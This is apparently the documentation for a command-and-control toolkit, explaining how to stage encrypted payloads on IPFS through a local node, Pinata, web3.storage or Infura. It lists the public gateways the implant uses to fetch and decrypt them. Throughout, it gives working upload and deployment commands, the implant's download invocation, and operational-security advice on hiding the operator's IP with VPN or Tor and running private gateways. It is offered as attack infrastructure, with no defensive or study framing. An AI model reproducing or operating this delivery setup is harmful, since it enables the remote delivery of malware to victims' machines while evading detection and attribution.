# IPFS Upload Guide

How to get payloads onto IPFS for use with the C2 IPFS payload delivery system.

## Option 1: Local IPFS Node (Recommended)

### Install IPFS (Kubo)

```bash
# Download Kubo v0.29.0
wget https://dist.ipfs.tech/kubo/v0.29.0/kubo_v0.29.0_linux-amd64.tar.gz

# Extract
tar -xzf kubo_v0.29.0_linux-amd64.tar.gz

# Install
cd kubo
sudo bash install.sh

# Initialize
ipfs init

# Start the daemon
ipfs daemon &

# Wait for it to be ready
ipfs id
```

### Upload a File

```bash
# Add a file to IPFS
ipfs add payload.enc

# Output: added QmX... payload.enc
# The hash is your CID: QmX...
```

### Start the Daemon on Boot

```bash
# Systemd service
sudo tee /etc/systemd/system/ipfs.service << 'EOF'
[Unit]
Description=IPFS Daemon
After=network.target

[Service]
ExecStart=/usr/local/bin/ipfs daemon
Restart=on-failure
User=root

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl enable ipfs
sudo systemctl start ipfs
```

### IPFS API

Once the daemon is running, the API is available at `http://127.0.0.1:5001/api/v0`.
The server uses this by default.

## Option 2: Pinata.cloud (Free Tier)

Pinata offers a free tier with 1GB of storage — no local node needed.

### Setup

1. Create an account at https://pinata.cloud
2. Go to API Keys and generate a JWT
3. Use it with the server/upload tool

### Upload via API

```bash
curl -X POST \
  -H "Authorization: Bearer <your-jwt>" \
  -F "file=@payload.enc" \
  https://api.pinata.cloud/pinning/pinFileToIPFS
```

Response: `{"IpfsHash":"Qm...","PinSize":1234,"Timestamp":"..."}`

### Upload via the C2 Tools

```bash
# Using the upload helper
./upload -key <key> -file payload.bin -pinata-jwt <jwt>

# Or with server
./server -pinata-jwt <jwt> -mode http
# Then in console: deploy payload.bin
```

## Option 3: web3.storage (Free)

https://web3.storage offers 5GB free with API key auth.

```bash
curl -X POST \
  -H "Authorization: Bearer <api-token>" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @payload.enc \
  https://api.web3.storage/upload
```

## Option 4: Infura IPFS API

Infura provides free IPFS API access (rate limited).

```bash
# Upload
curl -X POST \
  -F "file=@payload.enc" \
  "https://ipfs.infura.io:5001/api/v0/add"

# Requires project ID/secret for authenticated gateways
```

## Gateway URLs for Download

The implant supports multiple gateway fallback. Configure via `--gateways`.

Default gateways used by the implant:

| Gateway | URL Template |
|---------|-------------|
| ipfs.io | `https://ipfs.io/ipfs/%s` |
| Cloudflare | `https://cloudflare-ipfs.com/ipfs/%s` |
| Filebase | `https://ipfs.filebase.io/ipfs/%s` |
| dweb.link | `https://dweb.link/ipfs/%s` |
| cf-ipfs.com | `https://cf-ipfs.com/ipfs/%s` |

Custom gateways:

```bash
./client --cid-source <url> --decryption-key <key> \
  --gateways "https://gateway1.example.com/ipfs/%s,https://gateway2.example.com/ipfs/%s"
```

## CID Verification

When a file is added to IPFS, its content is hashed to produce a content identifier (CID).
The hash is derived from the file content — changing even one bit changes the CID.

The implant downloads the payload and can verify the SHA-256 hash matches the CID
(for CIDv0, this requires base58 decoding of the multihash — a proper production
implementation would add a base58 library for full verification).

## OpSec Notes

- **Local node**: Your IP is visible to the IPFS DHT when pinning. Use a VPN or Tor.
- **Pinata**: They can see your files. Encrypt before uploading (which this system does).
- **Encryption**: AES-256-GCM with a pre-shared key. Key compromise = payload compromise.
- **Gateway privacy**: Public gateways (ipfs.io, cloudflare-ipfs.com) log your IP.
- **Private gateways**: Run your own gateway for opsec. See: `https://github.com/ipfs/go-ipfs`
- **Pinning**: Files not pinned may be garbage collected. Pin your payloads or use a pinning service.
